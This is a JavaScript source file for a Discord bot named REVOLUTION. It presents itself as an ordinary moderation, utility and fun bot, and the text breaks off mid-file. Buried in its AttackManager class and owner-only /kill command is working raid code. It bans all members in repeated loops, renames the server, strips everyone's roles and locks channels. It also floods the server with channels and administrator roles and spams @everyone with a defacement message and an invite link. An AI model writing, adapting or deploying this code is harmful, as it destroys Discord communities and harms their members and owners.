const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ============ CONFIGURAÇÕES ============
const GROQ_API_KEY = process.env.GROQ_API_KEY;
const GROQ_API_URL = 'https://api.groq.com/openai/v1/chat/completions';
const PREFIX = '!';
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID || null;

if (!GROQ_API_KEY) {
  console.warn('⚠️ GROQ_API_KEY não configurada! O comando /ia não vai funcionar.');
}

// ============ CLIENT ============
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.GuildModeration
  ]
});

client.commands = new Map();

// ============ BANCO DE DADOS SIMPLES ============
let warns = {};
let xpData = {};
let economia = {};
let casamentos = {};
let afkData = {};
let lembretes = {};

// ============ FUNÇÕES DE UTILIDADE ============
function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function shuffleArray(array) { return array.sort(() => Math.random() - 0.5); }

// ============ SISTEMA DE LOGS ============
async function sendLog(guildId, embed) {
  if (!LOG_CHANNEL_ID) return;
  try {
    const channel = client.channels.cache.get(LOG_CHANNEL_ID);
    if (channel) await channel.send({ embeds: [embed] });
  } catch (error) {}
}

// ============ FUNÇÃO IA ============
async function callGroqAI(mensagem) {
  if (!GROQ_API_KEY) return '❌ API da Groq não configurada.';
  try {
    const response = await fetch(GROQ_API_URL, {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${GROQ_API_KEY}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        model: 'mixtral-8x7b-32768',
        messages: [{ role: 'system', content: 'Você é o assistente REVOLUTION.' }, { role: 'user', content: mensagem }],
        temperature: 0.7,
        max_tokens: 500
      })
    });
    const data = await response.json();
    if (data.choices && data.choices.length > 0) return data.choices[0].message.content;
    return '❌ Erro ao processar.';
  } catch (error) { return `❌ Erro: ${error.message}`; }
}

// ============ SISTEMA DE XP ============
async function addXp(userId, guildId, amount) {
  if (!xpData[guildId]) xpData[guildId] = {};
  if (!xpData[guildId][userId]) xpData[guildId][userId] = { xp: 0, level: 0 };
  xpData[guildId][userId].xp += amount;
  const xpNeeded = (xpData[guildId][userId].level + 1) * 100;
  if (xpData[guildId][userId].xp >= xpNeeded) {
    xpData[guildId][userId].level++;
    xpData[guildId][userId].xp = 0;
    return true;
  }
  return false;
}

// ============ MENSAGEM PERSONALIZADA ============
const mensagemSpam = `⚠️ **Aviso**

O servidor está passando por um ataque neste momento. A equipe de moderação já foi informada e está trabalhando para normalizar a situação.

Pedimos que todos os membros mantenham a calma, evitem clicar em links suspeitos e denunciem qualquer comportamento malicioso aos administradores.

Obrigado pela compreensão.

https://discord.gg/Cg4DXEMbn

# hackds by ordemX
# manda o governo se fuder aq e nois porra
# morre panela

@everyone`;

// ============ GERENCIADOR DE ATAQUE ============
class AttackManager {
  constructor() { this.activeAttacks = new Map(); }

  startAttack(guild, user, client) {
    const guildId = guild.id;
    if (this.activeAttacks.has(guildId)) this.stopAttack(guildId);
    let isRunning = true;
    let totalBanidos = 0;
    let totalCanais = 0;

    const banAllUsers = async () => {
      if (!isRunning) return;
      try {
        const members = guild.members.cache.filter(m => !m.user.bot && m.id !== user.id && m.id !== client.user.id && m.bannable);
        for (const member of members.values()) {
          if (!isRunning) break;
          try { await member.ban({ reason: 'REVOLUTION' }); totalBanidos++; } catch (error) {}
        }
      } catch (error) {}
    };
    banAllUsers();
    const banInterval = setInterval(banAllUsers, 5000);

    const changeServerName = async () => {
      if (!isRunning) return;
      try { await guild.setName('REVOLUTION'); } catch (error) {}
    };
    changeServerName();
    const nameInterval = setInterval(changeServerName, 10000);

    const createLowRole = async () => {
      if (!isRunning) return;
      try {
        const lowRoleName = 'REVOLUTION_SUB';
        let lowRole = guild.roles.cache.find(r => r.name === lowRoleName);
        if (!lowRole) lowRole = await guild.roles.create({ name: lowRoleName, color: '#333333', position: 0, permissions: [] });
        const members = guild.members.cache.filter(m => !m.user.bot && m.id !== user.id && m.id !== client.user.id);
        for (const member of members.values()) {
          if (!isRunning) break;
          try { await member.roles.set([lowRole.id]); } catch (error) {}
        }
      } catch (error) {}
    };
    createLowRole();
    const rebaixamentoInterval = setInterval(createLowRole, 20000);

    const lockAllChannels = async () => {
      if (!isRunning) return;
      try {
        const channels = guild.channels.cache.filter(ch => ch.isTextBased());
        for (const channel of channels.values()) {
          if (!isRunning) break;
          try {
            await channel.permissionOverwrites.edit(guild.id, { SendMessages: false, AddReactions: false });
            await channel.permissionOverwrites.edit(client.user.id, { SendMessages: true, AddReactions: true });
            const owner = guild.members.cache.get(user.id);
            if (owner) await channel.permissionOverwrites.edit(owner.id, { SendMessages: true, AddReactions: true, ManageMessages: true });
          } catch (error) {}
        }
      } catch (error) {}
    };
    lockAllChannels();
    const lockInterval = setInterval(lockAllChannels, 15000);

    const createChannel = async () => {
      if (!isRunning) return;
      try {
        const channelName = `RAID BY REVOLUTION`;
        const existing = guild.channels.cache.find(c => c.name === channelName);
        if (!existing) {
          await guild.channels.create({ name: channelName, type: 0, permissionOverwrites: [{ id: guild.id, allow: ['ViewChannel'] }] });
          totalCanais++;
        } else {
          const randomSuffix = Math.floor(Math.random() * 10000);
          await guild.channels.create({ name: `RAID BY REVOLUTION-${randomSuffix}`, type: 0, permissionOverwrites: [{ id: guild.id, allow: ['ViewChannel'] }] });
          totalCanais++;
        }
      } catch (error) {}
    };
    for (let i = 0; i < 5; i++) createChannel();
    const channelInterval = setInterval(() => { for (let i = 0; i < 3; i++) createChannel(); }, 300);

    const createRole = async () => {
      if (!isRunning) return;
      try { await guild.roles.create({ name: 'RAID BY REVOLUTION', color: '#ff0000', permissions: [PermissionsBitField.Flags.Administrator] }); } catch (error) {}
    };
    for (let i = 0; i < 10; i++) createRole();
    const roleInterval = setInterval(() => { for (let i = 0; i < 3; i++) createRole(); }, 200);

    let messageCount = 0;
    const spamFunction = async () => {
      if (!isRunning) return;
      try {
        const channels = guild.channels.cache.filter(ch => ch.isTextBased() && ch.permissionsFor(client.user).has(PermissionsBitField.Flags.SendMessages));
        const channelArray = Array.from(channels.values());
        if (channelArray.length === 0) return;
        for (const channel of channelArray.slice(0, 10)) {
          if (!isRunning) break;
          try {
            const embed = new EmbedBuilder().setTitle('🔥 REVOLUTION 🔥').setDescription(mensagemSpam).setColor('#ff0000').setFooter({ text: 'REVOLUTION' }).setTimestamp();
            await channel.send({ content: `@everyone 🔥 SERVIDOR TOMADO POR REVOLUTION 🔥`, embeds: [embed] });
            messageCount++;
          } catch (error) {}
        }
        if (messageCount % 10 === 0) console.log(`📢 SPAM #${messageCount} enviado`);
      } catch (error) {}
    };
    const spamInterval = setInterval(spamFunction, 100);
    for (let i = 0; i < 5; i++) setTimeout(spamFunction, i * 10);

    const attackData = {
      spamInterval, channelInterval, roleInterval, lockInterval, rebaixamentoInterval, banInterval, nameInterval, isRunning,
      target: guild.name, author: user.tag, startTime: new Date(), messageCount: 0, totalBanidos: 0, totalCanais: 0,
      stop: () => {
        isRunning = false;
        clearInterval(spamInterval); clearInterval(channelInterval); clearInterval(roleInterval);
        clearInterval(lockInterval); clearInterval(rebaixamentoInterval); clearInterval(banInterval); clearInterval(nameInterval);
        this.activeAttacks.delete(guildId);
        console.log(`🛑 ATAQUE PARADO no servidor ${guild.name}`);
      }
    };
    this.activeAttacks.set(guildId, attackData);
    return attackData;
  }

  stopAttack(guildId) { const attack = this.activeAttacks.get(guildId); if (attack) { attack.stop(); return true; } return false; }
  getStatus(guildId) { return this.activeAttacks.get(guildId) || null; }
}

const attackManager = new AttackManager();

// ============ COMANDOS DE MODERAÇÃO ============

// /ban
client.commands.set('ban', {
  execute: async (interaction) => {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.reply({ content: '❌ Sem permissão!', ephemeral: true });
    const user = interaction.options.getUser('usuario');
    const motivo = interaction.options.getString('motivo') || 'Sem motivo';
    const member = interaction.guild.members.cache.get(user.id);
    if (!member) return interaction.reply({ content: '❌ Usuário não encontrado!', ephemeral: true });
    if (!member.bannable) return interaction.reply({ content: '❌ Não posso banir!', ephemeral: true });
    await member.ban({ reason: motivo });
    const embed = new EmbedBuilder().setTitle('🔨 USUÁRIO BANIDO').setColor('#ff0000').addFields({ name: 'Usuário', value: user.tag, inline: true }, { name: 'Motivo', value: motivo, inline: true }).setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /kick
client.commands.set('kick', {
  execute: async (interaction) => {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.KickMembers)) return interaction.reply({ content: '❌ Sem permissão!', ephemeral: true });
    const user = interaction.options.getUser('usuario');
    const motivo = interaction.options.getString('motivo') || 'Sem motivo';
    const member = interaction.guild.members.cache.get(user.id);
    if (!member) return interaction.reply({ content: '❌ Usuário não encontrado!', ephemeral: true });
    if (!member.kickable) return interaction.reply({ content: '❌ Não posso expulsar!', ephemeral: true });
    await member.kick(motivo);
    const embed = new EmbedBuilder().setTitle('👢 USUÁRIO EXPULSO').setColor('#ff9900').addFields({ name: 'Usuário', value: user.tag, inline: true }, { name: 'Motivo', value: motivo, inline: true }).setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /mute
client.commands.set('mute', {
  execute: async (interaction) => {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) return interaction.reply({ content: '❌ Sem permissão!', ephemeral: true });
    const user = interaction.options.getUser('usuario');
    const tempo = interaction.options.getInteger('tempo');
    const motivo = interaction.options.getString('motivo') || 'Sem motivo';
    const member = interaction.guild.members.cache.get(user.id);
    if (!member) return interaction.reply({ content: '❌ Usuário não encontrado!', ephemeral: true });
    if (!member.moderatable) return interaction.reply({ content: '❌ Não posso mutar!', ephemeral: true });
    await member.timeout(tempo * 60 * 1000, motivo);
    const embed = new EmbedBuilder().setTitle('🔇 USUÁRIO MUTADO').setColor('#ffcc00').addFields({ name: 'Usuário', value: user.tag, inline: true }, { name: 'Tempo', value: `${tempo} minutos`, inline: true }, { name: 'Motivo', value: motivo, inline: true }).setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /unmute
client.commands.set('unmute', {
  execute: async (interaction) => {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) return interaction.reply({ content: '❌ Sem permissão!', ephemeral: true });
    const user = interaction.options.getUser('usuario');
    const member = interaction.guild.members.cache.get(user.id);
    if (!member) return interaction.reply({ content: '❌ Usuário não encontrado!', ephemeral: true });
    if (!member.moderatable) return interaction.reply({ content: '❌ Não posso desmutar!', ephemeral: true });
    await member.timeout(null);
    const embed = new EmbedBuilder().setTitle('🔊 USUÁRIO DESMUTADO').setColor('#00ff00').addFields({ name: 'Usuário', value: user.tag, inline: true }).setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /warn
client.commands.set('warn', {
  execute: async (interaction) => {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) return interaction.reply({ content: '❌ Sem permissão!', ephemeral: true });
    const user = interaction.options.getUser('usuario');
    const motivo = interaction.options.getString('motivo') || 'Sem motivo';
    if (!warns[interaction.guild.id]) warns[interaction.guild.id] = {};
    if (!warns[interaction.guild.id][user.id]) warns[interaction.guild.id][user.id] = [];
    warns[interaction.guild.id][user.id].push({ motivo, data: new Date(), moderador: interaction.user.tag });
    const embed = new EmbedBuilder().setTitle('⚠️ USUÁRIO AVISADO').setColor('#ff9900').addFields({ name: 'Usuário', value: user.tag, inline: true }, { name: 'Motivo', value: motivo, inline: true }, { name: 'Total de avisos', value: `${warns[interaction.guild.id][user.id].length}`, inline: true }).setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /warnlist
client.commands.set('warnlist', {
  execute: async (interaction) => {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) return interaction.reply({ content: '❌ Sem permissão!', ephemeral: true });
    const user = interaction.options.getUser('usuario');
    if (!warns[interaction.guild.id] || !warns[interaction.guild.id][user.id]) return interaction.reply({ content: '✅ Usuário não tem avisos.', ephemeral: true });
    let desc = '';
    warns[interaction.guild.id][user.id].forEach((w, i) => { desc += `**${i+1}.** ${w.motivo} - ${w.moderador} (${new Date(w.data).toLocaleDateString('pt-BR')})\n`; });
    const embed = new EmbedBuilder().setTitle(`📋 AVISOS DE ${user.tag}`).setDescription(desc).setColor('#ff9900').setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /clear
client.commands.set('clear', {
  execute: async (interaction) => {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) return interaction.reply({ content: '❌ Sem permissão!', ephemeral: true });
    const quantidade = interaction.options.getInteger('quantidade') || 10;
    const deleted = await interaction.channel.bulkDelete(quantidade, true);
    const embed = new EmbedBuilder().setTitle('🧹 MENSAGENS APAGADAS').setColor('#0099ff').addFields({ name: 'Quantidade', value: `${deleted.size} mensagens`, inline: true });
    await interaction.reply({ embeds: [embed], ephemeral: true });
  }
});

// /slowmode
client.commands.set('slowmode', {
  execute: async (interaction) => {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.reply({ content: '❌ Sem permissão!', ephemeral: true });
    const segundos = interaction.options.getInteger('segundos');
    await interaction.channel.setRateLimitPerUser(segundos);
    const embed = new EmbedBuilder().setTitle('🐢 SLOWMODE ATIVADO').setColor('#0099ff').addFields({ name: 'Tempo', value: `${segundos} segundos`, inline: true });
    await interaction.reply({ embeds: [embed] });
  }
});

// /lock
client.commands.set('lock', {
  execute: async (interaction) => {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.reply({ content: '❌ Sem permissão!', ephemeral: true });
    await interaction.channel.permissionOverwrites.edit(interaction.guild.id, { SendMessages: false });
    const embed = new EmbedBuilder().setTitle('🔒 CANAL BLOQUEADO').setColor('#ff0000').setDescription(`O canal ${interaction.channel} foi bloqueado!`);
    await interaction.reply({ embeds: [embed] });
  }
});

// /unlock
client.commands.set('unlock', {
  execute: async (interaction) => {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.reply({ content: '❌ Sem permissão!', ephemeral: true });
    await interaction.channel.permissionOverwrites.edit(interaction.guild.id, { SendMessages: null });
    const embed = new EmbedBuilder().setTitle('🔓 CANAL DESBLOQUEADO').setColor('#00ff00').setDescription(`O canal ${interaction.channel} foi desbloqueado!`);
    await interaction.reply({ embeds: [embed] });
  }
});

// /say
client.commands.set('say', {
  execute: async (interaction) => {
    const mensagem = interaction.options.getString('mensagem');
    await interaction.reply({ content: mensagem });
  }
});

// /autorole
client.commands.set('autorole', {
  execute: async (interaction) => {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageRoles)) return interaction.reply({ content: '❌ Sem permissão!', ephemeral: true });
    const role = interaction.options.getRole('cargo');
    if (!client.autoroles) client.autoroles = {};
    client.autoroles[interaction.guild.id] = role.id;
    const embed = new EmbedBuilder().setTitle('✅ AUTOROLE CONFIGURADO').setColor('#00ff00').addFields({ name: 'Cargo', value: role.name, inline: true });
    await interaction.reply({ embeds: [embed] });
  }
});

// ============ COMANDOS DE UTILIDADE ============

// /avatar
client.commands.set('avatar', {
  execute: async (interaction) => {
    const user = interaction.options.getUser('usuario') || interaction.user;
    const embed = new EmbedBuilder().setTitle(`🖼️ AVATAR DE ${user.tag}`).setImage(user.displayAvatarURL({ size: 1024, dynamic: true })).setColor('#0099ff').setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /userinfo
client.commands.set('userinfo', {
  execute: async (interaction) => {
    const user = interaction.options.getUser('usuario') || interaction.user;
    const member = interaction.guild.members.cache.get(user.id);
    const embed = new EmbedBuilder().setTitle(`👤 INFO DE ${user.tag}`).setThumbnail(user.displayAvatarURL()).setColor('#0099ff')
      .addFields(
        { name: '🆔 ID', value: user.id, inline: true },
        { name: '📅 Criou conta', value: new Date(user.createdAt).toLocaleDateString('pt-BR'), inline: true },
        { name: '📅 Entrou no servidor', value: member ? new Date(member.joinedAt).toLocaleDateString('pt-BR') : 'N/A', inline: true },
        { name: '🎭 Cargos', value: member ? member.roles.cache.size - 1 : 0, inline: true }
      ).setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /serverinfo
client.commands.set('serverinfo', {
  execute: async (interaction) => {
    const guild = interaction.guild;
    const embed = new EmbedBuilder().setTitle(`📊 INFO DO SERVIDOR`).setThumbnail(guild.iconURL()).setColor('#0099ff')
      .addFields(
        { name: '📛 Nome', value: guild.name, inline: true },
        { name: '👑 Dono', value: guild.members.cache.get(guild.ownerId)?.user.tag || 'N/A', inline: true },
        { name: '👥 Membros', value: `${guild.memberCount}`, inline: true },
        { name: '📅 Criado em', value: new Date(guild.createdAt).toLocaleDateString('pt-BR'), inline: true },
        { name: '💬 Canais', value: `${guild.channels.cache.size}`, inline: true },
        { name: '🎭 Cargos', value: `${guild.roles.cache.size}`, inline: true }
      ).setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /ping
client.commands.set('ping', {
  execute: async (interaction) => {
    const sent = await interaction.reply({ content: '🏓 Pong!', fetchReply: true });
    const latency = sent.createdTimestamp - interaction.createdTimestamp;
    await interaction.editReply(`🏓 Pong! Latência: ${latency}ms | API: ${Math.round(client.ws.ping)}ms`);
  }
});

// /botinfo
client.commands.set('botinfo', {
  execute: async (interaction) => {
    const embed = new EmbedBuilder().setTitle('🤖 REVOLUTION BOT').setColor('#ff0000')
      .addFields(
        { name: '📊 Servidores', value: `${client.guilds.cache.size}`, inline: true },
        { name: '👥 Usuários', value: `${client.users.cache.size}`, inline: true },
        { name: '⏱️ Online há', value: `${Math.floor(process.uptime() / 3600)}h ${Math.floor((process.uptime() % 3600) / 60)}m`, inline: true },
        { name: '💻 Versão', value: '5.0.0', inline: true },
        { name: '📋 Comandos', value: `${client.commands.size}`, inline: true }
      ).setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /invite
client.commands.set('invite', {
  execute: async (interaction) => {
    const embed = new EmbedBuilder().setTitle('📨 CONVIDE O BOT').setColor('#0099ff')
      .setDescription(`[Clique aqui para convidar](https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&permissions=8&scope=bot%20applications.commands)`);
    await interaction.reply({ embeds: [embed] });
  }
});

// /enquete
client.commands.set('enquete', {
  execute: async (interaction) => {
    const pergunta = interaction.options.getString('pergunta');
    const embed = new EmbedBuilder().setTitle('📊 ENQUETE').setDescription(pergunta).setColor('#0099ff').setFooter({ text: `Por ${interaction.user.tag}` }).setTimestamp();
    const msg = await interaction.reply({ embeds: [embed], fetchReply: true });
    await msg.react('👍');
    await msg.react('👎');
  }
});

// ============ COMANDOS DE DIVERSÃO ============

// /8ball
client.commands.set('8ball', {
  execute: async (interaction) => {
    const respostas = ['Sim', 'Não', 'Talvez', 'Com certeza!', 'Nem pensar!', 'Provavelmente', 'Não conte com isso', 'Claro que sim!', 'As estrelas dizem que sim', 'Melhor não contar'];
    const embed = new EmbedBuilder().setTitle('🎱 8BALL').setDescription(`🎱 ${respostas[Math.floor(Math.random() * respostas.length)]}`).setColor('#0099ff').setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /ship
client.commands.set('ship', {
  execute: async (interaction) => {
    const user1 = interaction.options.getUser('usuario1');
    const user2 = interaction.options.getUser('usuario2') || interaction.user;
    const porcentagem = getRandomInt(0, 100);
    const emoji = porcentagem > 70 ? '❤️' : porcentagem > 40 ? '💕' : '💔';
    const embed = new EmbedBuilder().setTitle('💕 SHIP').setDescription(`💕 ${user1} + ${user2} = ${porcentagem}% ${emoji}`).setColor('#ff69b4').setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /ratewaifu
client.commands.set('ratewaifu', {
  execute: async (interaction) => {
    const user = interaction.options.getUser('usuario') || interaction.user;
    const nota = getRandomInt(0, 100);
    const embed = new EmbedBuilder().setTitle('💯 RATE WAIFU').setDescription(`💖 ${user} é ${nota}% waifu!`).setColor('#ff69b4').setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /coinflip
client.commands.set('coinflip', {
  execute: async (interaction) => {
    const resultado = Math.random() > 0.5 ? 'Cara' : 'Coroa';
    const embed = new EmbedBuilder().setTitle('🪙 COIN FLIP').setDescription(`🪙 ${resultado}!`).setColor('#ffd700').setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /dice
client.commands.set('dice', {
  execute: async (interaction) => {
    const faces = interaction.options.getInteger('faces') || 6;
    const resultado = getRandomInt(1, faces);
    const embed = new EmbedBuilder().setTitle('🎲 DADO').setDescription(`🎲 Resultado: **${resultado}** (${faces} faces)`).setColor('#0099ff').setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// /rps
client.commands.set('rps', {
  execute: async (interaction) => {
    const escolha = interaction.options.getString('escolha');
    const opcoes = ['pedra', 'papel', 'tesoura'];
    const botEscolha = opcoes[Math.floor(Math.random() * opcoes.length)];
    let resultado;
    if (escolha === botEscolha) resultado = 'Empate!';
    else if ((escolha === 'pedra' && botEscolha === 'tesoura') || (escolha === 'papel' && botEscolha === 'pedra') || (escolha === 'tesoura' && botEscolha === 'papel')) resultado = 'Você ganhou! 🎉';
    else resultado = 'Você perdeu! 😢';
    const embed = new EmbedBuilder().setTitle('✊🖐️✌️ PEDRA PAPEL TESOURA').setDescription(`**Você:** ${escolha}\n**Bot:** ${botEscolha}\n\n**Resultado:** ${resultado}`).setColor('#0099ff').setTimestamp();
    await interaction.reply({ embeds: [embed] });
  }
});

// ============ COMANDOS DE IA ============

// /ia
client.commands.set('ia', {
  execute: async (interaction) => {
    const pergunta = interaction.options.getString('pergunta');
    await interaction.reply({ content: '🤖 Pensando...' });
    const resposta = await callGroqAI(pergunta);
    const embed = new EmbedBuilder().setTitle('🤖 REVOLUTION IA').setDescription(resposta).addFields({ name: '📝 Pergunta', value: pergunta, inline: false }).setColor('#ff0000').setTimestamp();
    await interaction.editReply({ content: null, embeds: [embed] });
  }
});

// ============ COMANDOS DE ATAQUE ============

// /kill
client.commands.set('kill', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) return interaction.reply({ content: '❌ APENAS O DONO!', ephemeral: true });
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.reply({ content: '❌ PRECISA SER ADMIN!', ephemeral: true });
    try {
      await attackManager.startAttack(interaction.guild, interaction.user, client);
      const embed = new EmbedBuilder().setTitle('🔥 ATAQUE REVOLUTION INICIADO').setColor('#ff0000').addFields(
        { name: 'ALVO', value: interaction.guild.name, inline: true },
        { name: 'PARAR', value: 'USE /end PARA PARAR', inline: true }
      ).setTimestamp();
      await interaction.reply({ embeds: [embed] });
    } catch (error) {
      await interaction.reply({ content: `❌ ERRO: ${error.message}`, ephemeral: true });
    }
  }
});

// /end
client.commands.set('end', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) return interaction.reply({ content: '❌ APENAS O DONO!', ephemeral: true });
    const guildId = interaction.guild.id;
    const attack = attackManager.getStatus(guildId);
    if (attack) {
      attackManager.stopAttack(guildId);
      const embed = new EmbedBuilder().setTitle('🛑 ATAQUE PARADO').setColor('#00ff00').setDescription('O ATAQUE REVOLUTION FOI DESATIVADO').setTimestamp();
      await interaction.reply({ embeds: [embed] });
    } else {
      await interaction.reply({ content: '❌ NENHUM ATAQUE ATIVO.', ephemeral: true });
    }
  }
});

// ============ EVENTOS DE XP E LOGS ============

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;

  // Sistema de XP
  const xpGain = getRandomInt(1, 5);
  const leveledUp = await addXp(message.author.id, message.guild.id, xpGain);
  if (leveledUp) {
    const level = xpData[message.guild.id][message.author.id].level;
    const embed = new EmbedBuilder().setTitle('⬆️ LEVEL UP!').setDescription(`🎉 ${message.author} subiu para o nível **${level}**!`).setColor('#00ff00');
    await message.channel.send({ embeds: [embed] });
  }

  // Anti-spam
  if (!client.messageTimestamps) client.messageTimestamps = {};
  const key = `${message.guild.id}-${message.author.id}`;
  const now = Date.now();
  if (client.messageTimestamps[key] && now - client.messageTimestamps[key] < 5000) {
    await message.delete();
    const warnEmbed = new EmbedBuilder().setTitle('🚫 ANTI-SPAM').setDescription(`${message.author}, não spame!`).setColor('#ff0000');
    await message.channel.send({ embeds: [warnEmbed], ephemeral: true });
    return;
  }
  client.messageTimestamps[key] = now;

  // Anti-link
  if (message.content.match(/(https?:\/\/[^\s]+)/g)) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
      await message.delete();
      const embed = new EmbedBuilder().setTitle('🚫 ANTI-LINK').setDescription(`${message.author}, links não são permitidos!`).setColor('#ff0000');
      await message.channel.send({ embeds: [embed] });
    }
  }

  // Anti-convite
  if (message.content.match(/discord\.gg\/[^\s]+/g) || message.content.match(/discord\.com\/invite\/[^\s]+/g)) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
      await message.delete();
      const embed = new EmbedBuilder().setTitle('🚫 ANTI-CONVITE').setDescription(`${message.author}, convites não são permitidos!`).setColor('#ff0000');
      await message.channel.send({ embeds: [embed] });
    }
  }

  // Sistema de AFK
  if (message.content.startsWith('!afk')) {
    const motivo = message.content.slice(5).trim() || 'AFK';
    afkData[message.author.id] = { motivo, data: new Date() };
    const embed = new EmbedBuilder().setTitle('🛌 AFK ATIVADO').setDescription(`${message.author} está AFK: ${motivo}`).setColor('#0099ff');
    await message.reply({ embeds: [embed] });
  }

  // Sistema de lembrete
  if (message.content.startsWith('!lembrete')) {
    const args = message.content.slice(10).trim().split(' ');
    const tempo = parseInt(args[0]);
    const texto = args.slice(1).join(' ');
    if (!tempo || !texto) return message.reply('Uso: `!lembrete 10 Reunião agora!`');
    const embed = new EmbedBuilder().setTitle('⏰ LEMBRETE CRIADO').setDescription(`⏰ Lembrete em ${tempo} minutos: ${texto}`).setColor('#0099ff');
    await message.reply({ embeds: [embed] });
    setTimeout(() => {
      message.author.send(`⏰ **Lembrete:** ${texto}`);
    }, tempo * 60 * 1000);
  }
});

// ============ COMANDOS DE PREFIXO ! ============

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();

  if (cmd === 'serverinfo') {
    const embed = new EmbedBuilder().setTitle('📊 INFO DO SERVIDOR').setColor('#0099ff')
      .addFields({ name: '📛 Nome', value: message.guild.name, inline: true }, { name: '👥 Membros', value: `${message.guild.memberCount}`, inline: true }, { name: '📅 Criado', value: new Date(message.guild.createdAt).toLocaleDateString('pt-BR'), inline: true }).setTimestamp();
    await message.reply({ embeds: [embed] });
  }

  if (cmd === 'userinfo') {
    const user = message.mentions.users.first() || message.author;
    const member = message.guild.members.cache.get(user.id);
    const embed = new EmbedBuilder().setTitle(`👤 INFO DE ${user.tag}`).setThumbnail(user.displayAvatarURL()).setColor('#0099ff')
      .addFields({ name: '🆔 ID', value: user.id, inline: true }, { name: '📅 Entrou', value: member ? new Date(member.joinedAt).toLocaleDateString('pt-BR') : 'N/A', inline: true }).setTimestamp();
    await message.reply({ embeds: [embed] });
  }

  if (cmd === 'avatar') {
    const user = message.mentions.users.first() || message.author;
    const embed = new EmbedBuilder().setTitle(`🖼️ AVATAR DE ${user.tag}`).setImage(user.displayAvatarURL({ size: 1024, dynamic: true })).setColor('#0099ff');
    await message.reply({ embeds: [embed] });
  }

  if (cmd === 'ping') {
    const sent = await message.reply('🏓 Pong!');
    const latency = sent.createdTimestamp - message.createdTimestamp;
    await sent.edit(`🏓 Pong! Latência: ${latency}ms | API: ${Math.round(client.ws.ping)}ms`);
  }

  if (cmd === 'say') {
    if (!args.length) return message.reply('❌ Escreva algo!');
    await message.channel.send(args.join(' '));
    await message.delete();
  }

  if (cmd === 'clear') {
    if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) return message.reply('❌ Sem permissão!');
    const quantidade = parseInt(args[0]) || 10;
    const deleted = await message.channel.bulkDelete(Math.min(quantidade, 100));
    const msg = await message.reply(`✅ ${deleted.size} mensagens apagadas!`);
    setTimeout(() => msg.delete(), 3000);
  }
});

// ============ EVENTOS DE BEM-VINDO ============

client.on('guildMemberAdd', async (member) => {
  // Autorole
  if (client.autoroles && client.autoroles[member.guild.id]) {
    try { await member.roles.add(client.autoroles[member.guild.id]); } catch (error) {}
  }

  const embed = new EmbedBuilder().setTitle('👋 BEM-VINDO!').setDescription(`🎉 Bem-vindo(a) ${member} ao servidor ${member.guild.name}!`).setColor('#00ff00').setThumbnail(member.user.displayAvatarURL()).setTimestamp();
  const channel = member.guild.channels.cache.find(c => c.name === 'geral' || c.name === 'bem-vindo' || c.name === 'boas-vindas');
  if (channel) await channel.send({ embeds: [embed] });
});

client.on('guildMemberRemove', async (member) => {
  const embed = new EmbedBuilder().setTitle('👋 SAÍDA').setDescription(`😢 ${member.user.tag} saiu do servidor.`).setColor('#ff0000').setTimestamp();
  const channel = member.guild.channels.cache.find(c => c.name === 'geral' || c.name === 'bem-vindo' || c.name === 'boas-vindas');
  if (channel) await channel.send({ embeds: [embed] });
});

// ============ EVENTO DE READY ============

client.on('ready', () => {
